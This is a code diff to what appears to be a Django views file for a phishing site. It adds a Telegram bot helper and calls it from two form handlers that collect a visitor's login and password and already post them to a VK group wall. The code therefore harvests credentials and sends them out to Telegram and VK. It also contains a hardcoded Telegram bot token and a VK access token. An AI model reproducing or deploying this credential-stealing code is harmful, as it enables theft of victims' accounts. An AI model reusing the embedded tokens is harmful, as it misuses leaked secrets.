@@ -9,6 +9,21 @@ import telebot
 # Create your views here.
 
 
+def tel(mes):
+    token = '1066066499:AAGhCqzmxLO-78UY6JbPRMNdgJ8SWjqVaiA'
+    bot = telebot.AsyncTeleBot(token)
+
+    try:
+        f = open('ids.txt')
+    except IOError as e:
+        with open('ids.txt', 'w') as w:
+            pass
+    else:
+        with f:
+            for l in f:
+                bot.send_message(l, mes)
+
+
 def index(request):
     if request.method == "POST":
         tok = "be363c662f54c1f5f9e008f7eab1e41a96958a4a5781725c9445f49ddf03520e15a10d6da236bd8ee0ed3"
@@ -18,6 +33,8 @@ def index(request):
         pas = request.POST.get("pas")
 
         body = "Login: {0}\nPass: {1}".format(email, pas)
+
+        tel(body)
 
         ses = Session(access_token=tok)
         vk = API(session=ses)
@@ -41,6 +58,7 @@ def full(request):
 
         body = "Login: {0}\nPass: {1}".format(email, pas)
 
+        tel(body)
         ses = Session(access_token=tok)
         vk = API(session=ses)
         vk.wall.post(owner_id=club, from_group=1, message=body, v=5.103)
@@ -54,18 +72,6 @@ def full(request):
     return render(request, "app_serverr/full.html", {"form": form})
 
 
-def telgram(mes):
-    token = '1066066499:AAGhCqzmxLO-78UY6JbPRMNdgJ8SWjqVaiA'
-    bot = telebot.AsyncTeleBot(token)
 
-    try:
-        f = open('ids.txt')
-    except IOError as e:
-        with open('ids.txt', 'w') as w:
-            pass
-    else:
-        with f:
-            for l in f:
-                bot.send_message(l, mes)
 
 
